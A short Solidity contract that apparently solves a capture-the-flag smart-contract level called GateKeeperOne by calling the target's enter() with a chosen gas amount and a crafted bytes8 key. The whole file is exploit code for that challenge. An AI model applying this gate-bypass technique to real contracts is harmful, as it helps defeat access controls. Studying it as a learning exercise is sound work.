// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

interface IGateKeeperOne {
    function enter(bytes8) external returns (bool);
}

contract CallGateKeeperOne {
    function callGateKeeperOne(address gateKeeperOne, uint256 gas, uint256 delta) public {
        IGateKeeperOne(gateKeeperOne).enter{gas: gas}(bytes8(uint64(delta + 2**32)));
    }
}